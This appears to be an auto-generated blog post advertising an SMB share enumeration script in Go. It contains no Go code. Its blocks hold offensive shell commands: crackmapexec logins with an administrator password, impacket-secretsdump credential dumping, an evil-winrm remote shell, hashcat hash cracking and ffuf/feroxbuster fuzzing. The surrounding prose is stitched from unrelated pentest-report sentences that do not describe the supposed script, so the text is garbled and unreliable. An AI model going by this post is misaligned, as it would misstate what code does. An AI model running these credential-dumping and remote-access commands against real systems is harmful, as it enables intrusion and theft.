---
TitleSEO: "SMB Share Enumeration Script in Go | ZureFX"
TitlePost: "SMB Share Enumeration Script — Go"
Author: "ZureFX"
Description: "A Go script for smb share enumeration script. Built for security research and automation."
Keywords: "python, go, fuzzer, scanner"
URL: "https://zurefx.github.io/scripting/script-smb-share-enumeration-script-689.html"
URL_IMAGES: ""
Date: "2024-11-17"
Tags: "Python, Go, Fuzzer, Scanner"
Section: "scripting"
Lang: "en"
main_img: "script-smb-share-enumeration-script-689"
Permalink: "/scripting/script-smb-share-enumeration-script-689.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

The database credentials were hardcoded in the application source code. Initial enumeration revealed several interesting open ports on the target. The target system was identified as running a vulnerable version of the service.

Built with **Go** for offensive security automation.

### Requirements

- Go
- `chisel`
- `nmap`
- `impacket`

## Implementation

### Core Logic

Lateral movement was facilitated by reusing discovered credentials across services. The web application was vulnerable to Server-Side Template Injection (SSTI).

```go
crackmapexec smb 10.40.165.1 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
crackmapexec smb 10.24.13.223 -u administrator -p 'P@ssw0rd!' --shares
feroxbuster -h
```

The application stored sensitive credentials in an unencrypted configuration file. The web application was vulnerable to Server-Side Template Injection (SSTI).

### Helper Functions

Network traffic analysis revealed unencrypted communications containing user credentials. Authentication bypass was achieved through careful manipulation of the login mechanism.

```go
feroxbuster -h
impacket-secretsdump administrator:'P@ssw0rd!'@10.25.194.2
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.60.95.150/FUZZ
```

## Usage

### Basic Usage

Token impersonation allowed elevation to SYSTEM privileges on the target. The application stored sensitive credentials in an unencrypted configuration file.

```bash
evil-winrm -i 10.28.104.21 -u administrator -p 'P@ssw0rd!'
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

### Advanced Options

The target system was identified as running a vulnerable version of the service. Initial enumeration revealed several interesting open ports on the target. Group Policy Preferences contained encrypted but recoverable credentials.

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.126.192.57/FUZZ
feroxbuster -h
```

## Output

### Example Output

Weak file permissions allowed modification of critical system files. Lateral movement was facilitated by reusing discovered credentials across services.

```
[+] Scanning target...
[+] Found 15 results
[+] Done in 23.30s
```
